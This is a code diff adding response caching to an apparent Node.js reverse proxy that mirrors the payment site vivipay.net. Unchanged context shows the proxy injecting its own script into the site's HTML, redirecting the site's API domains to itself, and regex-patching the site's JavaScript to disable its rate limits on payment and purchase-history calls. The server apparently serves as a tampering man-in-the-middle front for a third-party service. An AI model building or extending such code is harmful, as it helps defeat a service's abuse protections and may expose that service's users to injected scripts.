@@ -48,6 +48,25 @@ const CACHE_TTL = 5000;
 const tokenUserMap = {};
 const ipUserMap = {};
 
+// ── In-memory proxy cache ────────────────────────────────────────────────────
+// JS files: content-hashed filenames — cache indefinitely (never change)
+// HTML:     cache 30s — avoids vivipay.net round-trip on every refresh
+// CSS/img:  served directly from vivipay.net via <base> tag, not cached here
+const proxyCache = new Map(); // key → { buf, ct, status, ts, ttl }
+function cacheGet(key) {
+  const e = proxyCache.get(key);
+  if (!e) return null;
+  if (e.ttl > 0 && Date.now() - e.ts > e.ttl) { proxyCache.delete(key); return null; }
+  return e;
+}
+function cacheSet(key, buf, ct, status, ttl) {
+  // Limit total cache size to ~15MB to avoid OOM
+  if (buf.length < 20 * 1024 * 1024) {
+    proxyCache.set(key, { buf, ct, status, ts: Date.now(), ttl });
+  }
+}
+// ────────────────────────────────────────────────────────────────────────────
+
 async function ensureWebhook() {
   if (!bot || webhookSet) return;
   try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch(e) {}
@@ -1731,6 +1750,16 @@ app.all('*', async (req, res) => {
 
     // HTML — inject our script + set base so static assets load from vivipay.net directly
     if (ct.includes('text/html')) {
+      const htmlCacheKey = 'html:' + path;
+      const htmlCached = cacheGet(htmlCacheKey);
+      if (htmlCached) {
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
+        res.setHeader('Pragma', 'no-cache');
+        res.setHeader('content-type', 'text/html; charset=utf-8');
+        res.setHeader('content-length', String(htmlCached.buf.length));
+        res.status(htmlCached.status).end(htmlCached.buf);
+        return;
+      }
       let html = await response.text();
 
       const proxyBase = 'https://' + PROXY_HOST;
@@ -1764,6 +1793,8 @@ app.all('*', async (req, res) => {
       }
 
       const buf = Buffer.from(html, 'utf-8');
+      // Cache HTML server-side for 30s — avoids vivipay.net round-trip on each refresh
+      cacheSet(htmlCacheKey, buf, 'text/html; charset=utf-8', response.status, 30000);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
       res.setHeader('Pragma', 'no-cache');
       res.setHeader('content-type', 'text/html; charset=utf-8');
@@ -1774,27 +1805,45 @@ app.all('*', async (req, res) => {
 
     // JS — rewrite tivox/qonix references to proxy + patch frontend rate limiter
     if (ct.includes('javascript')) {
-      let js = await response.text();
-      const proxyBase = 'https://' + PROXY_HOST;
-      js = js.replace(/https:\/\/tivox\.icu/g, proxyBase);
-      js = js.replace(/https:\/\/qonix\.click/g, proxyBase);
+      // Skip cache for HEAD requests (no body — would cache 0 bytes)
+      if (req.method === 'HEAD') {
+        res.setHeader('Cache-Control', 'public, max-age=86400, immutable');
+        res.setHeader('content-type', ct);
+        res.status(response.status).end();
+        return;
+      }
+      const cacheKey = 'js:' + path;
+      let cached = cacheGet(cacheKey);
+      let buf, finalCt;
 
-      // Patch frontend rate limiter — "Please slow down." blocker
-      // Use 999999999 (not 0) — 0 is falsy, some code paths do `windowMs || 1000`
-      js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1e3/g, 'API_HTTP_WINDOW_MS=999999999');
-      js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1000/g, 'API_HTTP_WINDOW_MS=999999999');
-      js = js.replace(/API_HTTP_DEFAULT_MAX_PER_WINDOW\s*=\s*1\b/g, 'API_HTTP_DEFAULT_MAX_PER_WINDOW=9999');
-      js = js.replace(/API_HTTP_WAITPAYER_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_WAITPAYER_MAX_PER_WINDOW=9999');
-      js = js.replace(/API_HTTP_BUY_HISTORY_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_BUY_HISTORY_MAX_PER_WINDOW=9999');
-      js = js.replace(/API_HTTP_RATE_LIMIT_MSG\s*=\s*"Please slow down\."/g, 'API_HTTP_RATE_LIMIT_MSG=""');
+      if (cached) {
+        buf = cached.buf;
+        finalCt = cached.ct;
+      } else {
+        let js = await response.text();
+        const proxyBase = 'https://' + PROXY_HOST;
+        js = js.replace(/https:\/\/tivox\.icu/g, proxyBase);
+        js = js.replace(/https:\/\/qonix\.click/g, proxyBase);
 
-      const buf = Buffer.from(js, 'utf-8');
-      // Force no-cache so browser always fetches fresh patched JS (never serves old cached version)
-      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
-      res.setHeader('Pragma', 'no-cache');
-      res.setHeader('content-type', ct);
+        // Patch frontend rate limiter — "Please slow down." blocker
+        js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1e3/g, 'API_HTTP_WINDOW_MS=999999999');
+        js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1000/g, 'API_HTTP_WINDOW_MS=999999999');
+        js = js.replace(/API_HTTP_DEFAULT_MAX_PER_WINDOW\s*=\s*1\b/g, 'API_HTTP_DEFAULT_MAX_PER_WINDOW=9999');
+        js = js.replace(/API_HTTP_WAITPAYER_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_WAITPAYER_MAX_PER_WINDOW=9999');
+        js = js.replace(/API_HTTP_BUY_HISTORY_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_BUY_HISTORY_MAX_PER_WINDOW=9999');
+        js = js.replace(/API_HTTP_RATE_LIMIT_MSG\s*=\s*"Please slow down\."/g, 'API_HTTP_RATE_LIMIT_MSG=""');
+
+        buf = Buffer.from(js, 'utf-8');
+        finalCt = ct;
+        // JS filenames have content-hash (e.g. index.cc0347da.js) — cache indefinitely
+        cacheSet(cacheKey, buf, finalCt, response.status, 0);
+      }
+
+      // Content-hashed JS: safe to cache in browser too — instant on repeat visits
+      res.setHeader('Cache-Control', 'public, max-age=86400, immutable');
+      res.setHeader('content-type', finalCt);
       res.setHeader('content-length', String(buf.length));
-      res.status(response.status).end(buf);
+      res.status(200).end(buf);
       return;
     }
 
